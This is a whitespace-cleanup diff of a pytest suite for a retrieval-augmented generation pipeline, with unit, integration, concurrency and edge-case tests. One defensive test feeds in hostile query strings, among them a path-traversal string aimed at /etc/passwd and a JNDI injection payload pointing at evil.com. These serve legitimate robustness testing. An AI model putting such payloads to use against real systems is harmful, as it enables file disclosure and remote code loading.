@@ -19,7 +19,7 @@ from tldw_Server_API.app.core.RAG.rag_service.types import Document, DataSource
 
 class TestUnifiedPipelineUnit:
     """Unit tests for the unified RAG pipeline."""
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_minimal_query_execution(self):
@@ -35,17 +35,17 @@ class TestUnifiedPipelineUnit:
             ]
             mock_retriever_instance.retrieve = AsyncMock(return_value=large_docs)
             mock_retriever.return_value = mock_retriever_instance
-            
+
             # Call the actual function with minimal params
             result = await unified_rag_pipeline(
                 query="What is RAG?",
                 top_k=5
             )
-            
+
             # Verify basic structure (Pydantic response)
             assert isinstance(result, UnifiedRAGResponse)
             assert result.query == "What is RAG?"
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_query_with_common_parameters(self):
@@ -54,7 +54,7 @@ class TestUnifiedPipelineUnit:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             result = await unified_rag_pipeline(
                 query="Explain machine learning",
                 top_k=10,
@@ -62,7 +62,7 @@ class TestUnifiedPipelineUnit:
                 enable_reranking=True,
                 temperature=0.7
             )
-            
+
             assert isinstance(result, UnifiedRAGResponse)
             assert result.query == "Explain machine learning"
 
@@ -122,18 +122,18 @@ class TestUnifiedPipelineUnit:
             assert len(result.chunk_citations) >= 1
 
     # Note: Retrieval-time enhanced chunking removed from unified pipeline
-    
+
     @pytest.mark.unit
-    @pytest.mark.asyncio 
+    @pytest.mark.asyncio
     async def test_empty_query_handling(self):
         """Test handling of empty or invalid queries."""
         # Empty query should be handled gracefully
         result = await unified_rag_pipeline(query="")
-        
+
         assert isinstance(result, UnifiedRAGResponse)
         # Should handle empty query without crashing
         assert result.query == ""
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_sources_parameter(self):
@@ -142,13 +142,13 @@ class TestUnifiedPipelineUnit:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             # Test with specific sources
             result = await unified_rag_pipeline(
                 query="test query",
                 sources=["media_db", "notes"]
             )
-            
+
             assert isinstance(result, UnifiedRAGResponse)
 
 # ========================================================================
@@ -157,7 +157,7 @@ class TestUnifiedPipelineUnit:
 
 class TestUnifiedPipelineIntegration:
     """Integration tests using real components."""
-    
+
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_pipeline_with_real_database(self, populated_media_db):
@@ -170,10 +170,10 @@ class TestUnifiedPipelineIntegration:
             # Pass the database instance if the pipeline accepts it
             # database=populated_media_db
         )
-        
+
         assert isinstance(result, UnifiedRAGResponse)
         assert result.query is not None
-    
+
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_end_to_end_retrieval(self, populated_media_db):
@@ -183,29 +183,29 @@ class TestUnifiedPipelineIntegration:
             sources=["media_db"],
             top_k=10
         )
-        
+
         assert isinstance(result, UnifiedRAGResponse)
         # Check if documents were retrieved (list of dicts)
         assert isinstance(result.documents, list)
-    
+
     @pytest.mark.integration
     @pytest.mark.asyncio
     @pytest.mark.slow
     async def test_concurrent_requests(self, populated_media_db):
         """Test handling multiple concurrent requests."""
         import asyncio
-        
+
         queries = ["RAG", "vector", "retrieval", "generation", "database"]
-        
+
         # Create concurrent tasks
         tasks = [
             unified_rag_pipeline(query=q, sources=["media_db"], top_k=5)
             for q in queries
         ]
-        
+
         # Execute concurrently
         results = await asyncio.gather(*tasks)
-        
+
         assert len(results) == len(queries)
         for result in results:
             assert isinstance(result, UnifiedRAGResponse)
@@ -216,7 +216,7 @@ class TestUnifiedPipelineIntegration:
 
 class TestProductionScenarios:
     """Test scenarios that reflect actual production usage."""
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_chatbot_query_pattern(self):
@@ -225,7 +225,7 @@ class TestProductionScenarios:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             result = await unified_rag_pipeline(
                 query="Follow up on the previous question",
                 sources=["media_db", "chats"],
@@ -233,9 +233,9 @@ class TestProductionScenarios:
                 temperature=0.7,
                 user_id="test_user_123"
             )
-            
+
             assert isinstance(result, UnifiedRAGResponse)
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_research_query_pattern(self):
@@ -244,7 +244,7 @@ class TestProductionScenarios:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             result = await unified_rag_pipeline(
                 query="What are the latest developments in RAG systems?",
                 sources=["media_db", "notes"],
@@ -253,9 +253,9 @@ class TestProductionScenarios:
                 enable_reranking=True,
                 min_relevance_score=0.7
             )
-            
+
             assert isinstance(result, UnifiedRAGResponse)
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_api_endpoint_pattern(self):
@@ -264,16 +264,16 @@ class TestProductionScenarios:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             # Simulate API request parameters
             api_request = {
                 "query": "User question from API",
                 "top_k": 10,
                 "user_id": "api_user_123"
             }
-            
+
             result = await unified_rag_pipeline(**api_request)
-            
+
             assert isinstance(result, UnifiedRAGResponse)
 
 # ========================================================================
@@ -282,7 +282,7 @@ class TestProductionScenarios:
 
 class TestPerformanceAndEdgeCases:
     """Test performance characteristics and edge cases."""
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_large_result_set_handling(self):
@@ -296,14 +296,14 @@ class TestPerformanceAndEdgeCases:
             ]
             mock_retriever_instance.retrieve = AsyncMock(return_value=large_docs)
             mock_retriever.return_value = mock_retriever_instance
-            
+
             result = await unified_rag_pipeline(
                 query="broad search query",
                 top_k=100
             )
-            
+
             assert isinstance(result, UnifiedRAGResponse)
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_special_characters_in_query(self):
@@ -314,13 +314,13 @@ class TestPerformanceAndEdgeCases:
             "../../etc/passwd",
             "${jndi:ldap://evil.com}"
         ]
-        
+
         for query in dangerous_queries:
             # Should handle safely without throwing exceptions
             result = await unified_rag_pipeline(query=query)
             assert isinstance(result, UnifiedRAGResponse)
             assert result.query == query
-    
+
     @pytest.mark.unit
     @pytest.mark.asyncio
     async def test_various_parameter_combinations(self):
@@ -347,12 +347,12 @@ class TestPerformanceAndEdgeCases:
                 "enable_citations": True
             }
         ]
-        
+
         with patch('tldw_Server_API.app.core.RAG.rag_service.unified_pipeline.MultiDatabaseRetriever') as mock_retriever:
             mock_retriever_instance = MagicMock()
             mock_retriever_instance.retrieve = AsyncMock(return_value=[])
             mock_retriever.return_value = mock_retriever_instance
-            
+
             for params in test_cases:
                 result = await unified_rag_pipeline(**params)
                 assert isinstance(result, UnifiedRAGResponse)
